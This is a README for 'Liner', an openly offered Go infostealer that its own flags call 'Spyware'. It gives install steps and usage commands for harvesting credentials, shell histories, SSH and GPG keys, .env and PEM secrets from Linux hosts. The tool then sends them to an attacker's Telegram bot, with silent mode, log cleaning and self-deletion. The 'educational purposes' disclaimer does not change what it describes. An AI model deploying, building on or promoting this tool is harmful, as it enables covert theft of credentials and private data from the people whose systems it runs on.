# Liner - Data Collection & Telegram Transfer Tool

**Liner** is a command-line tool for collecting sensitive data (credentials, session files, private tokens, etc.) from a Linux system and transferring them to a specified Telegram chat via a bot.  
It's written in Go and supports silent execution, self-deletion, and concurrent file upload.

> ⚠️ **Warning:** This tool is intended **only for educational and ethical purposes**. Any unauthorized or malicious use is strictly prohibited and may violate local laws.

## 🔧 Features

- Dump credentials, passwords, session files, or all sensitive data.
- Generate tree structure of file system and home directories.
- Compress and transfer collected data to Telegram chat via bot API.
- Support for silent mode (`--silent`) and binary self-deletion.
- Concurrent upload to improve speed.

---

## 📦 Requirements

Install required packages:

```bash
sudo apt install zip coreutils tree
```

Also required:

- A **Telegram bot token** ([@BotFather](https://t.me/BotFather))
- A **Telegram chat ID** (user or group)

---

## 🚀 Installation

```bash
git clone https://github.com/Nowafen/liner.git
cd liner
go build -v -o liner ./cmd

mv liner /usr/bin
chmod +x /usr/bin/liner

```

Verify installation:

```bash
liner --version
# Output: Liner version: x.x
```

---

## 🛠️ Usage

Basic syntax:

```bash
liner --mode Spyware --dump <TYPE> --token <TOKEN> --id <CHAT_ID> [options]
```

### Required Flags

- `--mode Spyware` (only mode supported for now)
- `--dump`:  
  - `Credentials`: .git-credentials, keyrings  
  - `Password`: .bash_history, .zsh_history  
  - `Session`: .ssh, .gnupg  
  - `privateDATA`: *.env, *.pem, secrets  
  - `all`: Everything above
- `--token`: Your Telegram bot token
- `--id`: Telegram chat ID

### Optional Flags

- `--silent`: Suppress all output
- `--version`: Show current version
- `--update`: Check for new version
- `--help`: Show help message

---

## 💡 Examples

```bash
sudo liner --mode Spyware --dump Password --token <BOT_TOKEN> --id <CHAT_ID>
```

```bash
sudo liner --mode Spyware --dump all --token <BOT_TOKEN> --id <CHAT_ID> --silent
```

---

## 🧠 How It Works

1. **OS Check:** Validates if Linux is being used.
2. **File Collection:** Gathers files per `--dump` mode.
3. **Tree Generation:** Uses `tree` to list directories.
4. **Compression:** Packs data into `liner_data.zip`.
   - Splits to 25MB parts if >48MB.
5. **Telegram Upload:** Sends intro message, structure files, then zipped data.
6. **Cleanup:** Deletes temp files, cleans logs, self-deletes binary.

---

## ⚙️ Troubleshooting

- `liner` not found?  
  Make sure `~/go/bin` is in `$PATH`.

```bash
echo $PATH
```

- Telegram upload fails with `429 Too Many Requests` or timeout?  
  Check your connection or reduce concurrency in `core/telegram.go`.

- No files sent?  
  Ensure correct `--dump` and permissions (`sudo` if needed).

- Recombine split files on receiving side:

```bash
cat part_* > liner_data.zip
unzip liner_data.zip
```

---

## 🤝 Contributing

Pull requests and issues are welcome. Let’s improve this project together.

## 📜 License

[MIT License](./LICENSE)

